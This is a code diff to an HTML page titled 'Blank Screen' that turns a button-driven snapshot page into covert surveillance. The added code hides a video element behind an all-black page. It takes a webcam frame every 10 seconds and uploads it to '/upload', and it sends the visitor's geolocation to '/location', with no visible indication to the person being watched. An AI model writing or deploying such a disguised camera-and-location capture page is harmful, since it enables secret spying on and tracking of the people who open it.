@@ -6,57 +6,63 @@
   <title>Blank Screen</title>
   <style>
     body {
-      background-color: black;  /* Set the background color to black */
+      background-color: black;
       margin: 0;
-      height: 100vh;  /* Full viewport height */
-    }
-    button {
-      position: absolute;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      padding: 10px 20px;
-      font-size: 16px;
-      color: white;
-      background-color: #333;
-      border: none;
-      border-radius: 5px;
+      height: 100vh;
+      overflow: hidden;
     }
   </style>
 </head>
 <body>
-  <button onclick="captureSnapshot()">Capture Snapshot</button>
+  <video id="video" autoplay muted playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    // Capture a snapshot (still sends image data to the backend)
-    function captureSnapshot() {
-      // Create a canvas and take a snapshot (even if no video feed is visible)
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
-      
-      // Set canvas dimensions (adjust size as needed)
-      canvas.width = 640;
-      canvas.height = 480;
-      
-      // Create a black background for the snapshot (you can modify this if you want to add something else)
-      context.fillStyle = 'black';
-      context.fillRect(0, 0, canvas.width, canvas.height);
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-      // Convert canvas to image data
-      const dataURL = canvas.toDataURL('image/jpeg');
+    // Function to capture video frame and send to server
+    async function captureAndSend() {
+      // Set canvas dimensions to video size
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-      // Send the image data to the server
-      fetch('/upload', {
+      // Draw the current video frame on the canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas to a Base64 image
+      const image = canvas.toDataURL('image/jpeg');
+
+      // Send image to the server
+      await fetch('/upload', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: dataURL })
-      }).then(response => {
-        console.log('Image uploaded successfully');
-      }).catch(error => {
-        console.log('Error uploading image:', error);
+        body: JSON.stringify({ image })
+      });
+
+      // Get location and send to server
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const { latitude, longitude } = position.coords;
+        await fetch('/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude })
+        });
       });
     }
+
+    // Access camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Start capturing every 10 seconds
+        setInterval(captureAndSend, 10000);
+      })
+      .catch(error => {
+        console.error('Error accessing camera:', error);
+      });
   </script>
 </body>
 </html>
